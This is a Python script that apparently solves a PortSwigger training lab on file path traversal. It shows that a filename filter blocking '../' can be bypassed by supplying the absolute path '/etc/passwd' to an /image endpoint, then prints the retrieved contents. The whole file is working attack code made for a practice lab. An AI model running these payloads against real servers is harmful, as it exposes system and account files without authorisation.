# Lab 02 — File path traversal, traversal sequences blocked with absolute path bypass
# PortSwigger: https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass
#
# Vulnerability: The app blocks ../ sequences but still accepts an absolute
#                path unmodified — the underlying read function honours it
# Aim:           Retrieve the contents of /etc/passwd
#
# Technique:
#   Confirm relative traversal is blocked, then supply the target file as a
#   bare absolute path with no traversal sequence in it at all.
#
# Usage: python path_traversal_lab02.py <url>

import sys
import urllib3
from proxies import proxies
from path_traversal_utils import banner, section, make_session, try_traversal_payload, print_box

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

RELATIVE_PAYLOAD = "../../../etc/passwd"
ABSOLUTE_PAYLOAD  = "/etc/passwd"

if __name__ == "__main__":
    banner()
    section("LAB 02 — TRAVERSAL BLOCKED, ABSOLUTE PATH BYPASS")

    if len(sys.argv) != 2:
        print("  Usage: python path_traversal_lab02.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    # ── Step 1: confirm relative traversal is blocked ────────────────────────
    print("  ── Step 1: confirm relative traversal is blocked\n")
    try_traversal_payload(session, url, "/image", "filename", RELATIVE_PAYLOAD,
                           label="Relative traversal (expected blocked)")

    # ── Step 2: try the absolute path directly ─────────────────────────────
    print("\n  ── Step 2: bypass with a plain absolute path\n")
    r = try_traversal_payload(session, url, "/image", "filename", ABSOLUTE_PAYLOAD,
                               label="Absolute path bypass")

    if "root:" in r.text:
        print_box("/etc/passwd contents (truncated)", r.text[:800])
    else:
        print("\n  ✘  /etc/passwd contents not found — inspect manually")
        print_box("Raw response snippet", r.text[:400])
